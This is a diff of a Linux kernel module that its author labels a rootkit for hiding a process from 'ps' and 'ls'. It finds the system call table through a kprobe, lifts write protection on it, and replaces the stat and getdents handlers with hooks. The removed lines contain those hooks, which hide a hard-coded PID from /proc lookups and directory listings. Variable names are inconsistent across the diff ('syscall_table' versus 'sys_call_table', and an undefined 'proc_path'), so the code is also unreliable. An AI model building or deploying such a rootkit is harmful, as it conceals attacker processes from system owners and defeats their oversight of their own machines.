@@ -1,104 +1,45 @@
 #include <linux/module.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
+#include <linux/kprobes.h>
 #include <asm/unistd.h>
 
-#define MAXPATH 150
-#define PATT_PATH "/proc/"
+#include "functions.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tal");
-MODULE_DESCRIPTION("print PIDS");
+MODULE_DESCRIPTION("A Rootkit for hiding a process from 'ps' && 'ls' commands");
+MODULE_VERSION("0.0.1");
 
-char path[MAXPATH];
-char *pidpath="4591";
 
-unsigned long kallsyms_lookup_addr;
-unsigned long (*kallsyms_lookup_name)(const char *name);
-unsigned long *sys_call_table;
-asmlinkage int (*old_stat)(const struct pt_regs *regs);
-asmlinkage int (*old_getdents)(const struct pt_regs *regs);
+static int __init entry_rootkit(void){
+    buffer_path_pid();
 
-struct linux_dirent {
-	unsigned long  d_ino;     /* Inode number */
-    unsigned long  d_off;     /* Offset to next linux_dirent */
-    unsigned short d_reclen;  /* Length of this linux_dirent */
-    char           d_name[];  /* Filename (null-terminated) */
-};
+    register_kprobe(&kp);
+    syscall_table = kp.addr;
+    set_addr_rw((unsigned long) sys_call_table);
 
-int set_addr_rw(unsigned long _addr){
-    unsigned int level;
-    pte_t *pte;
-    pte = lookup_address(_addr, &level);
+    old_stat = (void*) sys_call_table[__NR_stat];
+	old_getdents = (void*) sys_call_table[__NR_getdents];
 
-    if (pte->pte &~ _PAGE_RW) {
-        pte->pte = (pte->pte) | _PAGE_RW;
-    }
+    sys_call_table[__NR_stat] = (unsigned long) new_stat;
+	sys_call_table[__NR_getdents] = (unsigned long) new_getdents;
 
+    set_addr_ro((unsigned long) sys_call_table);
+    
     return 0;
 }
 
-int set_addr_ro(unsigned long _addr){
-    unsigned int level;
-    pte_t *pte;
-    pte = lookup_address(_addr, &level);
+static void __exit exit_rootkit(void){
+    set_addr_rw((unsigned long) sys_call_table);
+    
+    sys_call_table[__NR_stat] = (unsigned long) old_stat;
+    
+	sys_call_table[__NR_getdents] = (unsigned long) old_getdents;
 
-    pte->pte = (pte->pte) &~ _PAGE_RW;
-
-    return 0;
+    set_addr_ro((unsigned long) sys_call_table);
+    unregister_kprobe(&kp);
 }
 
-void pid_path(void){
-    strncpy(path, PATT_PATH, sizeof(PATT_PATH));
-    strncat(path, pidpath,sizeof(pidpath));
-
-}
-
-
-asmlinkage int new_stat(const struct pt_regs *regs) {
-
-	char *path = (char*) regs->di;
-	
-       // perform our malicious code here- the HOOK!
-       if (strstr(path, proc_path) != NULL) {
-	       
-	       // inside the call to our hidden process, return error
-	       return -1;
-	}
-
-        // executing the original stat handler
-        return (*old_stat)(regs);
-}
-
-asmlinkage int new_getdents(const struct pt_regs *regs) {
-
-    int ret;
-
-    // the current structure
-    struct linux_dirent *curr = (struct linux_dirent*)regs->si;
-
-    int i = 0;
-
-    ret = (*old_getdents)(regs);
-
-	// going threw the entries, looking for our pid
-    while (i < ret) {
-
-		// checking if it is our process
-        if (!strcmp(curr->d_name, pidpath)) {
-
-            // length of this linux_dirent
-            int reclen = curr->d_reclen;
-            char *next = (char*)curr + reclen;
-            int len = (int)regs->si + ret - (uintptr_t)next;
-            memmove(curr, next, len);
-            ret -= reclen;
-            continue;
-        }
-
-    i += curr->d_reclen;
-    curr = (struct linux_dirent*)((char*)regs->si + i);
-    }
-
-    return ret;
-}
+module_init(entry_rootkit);
+module_exit(exit_rootkit);
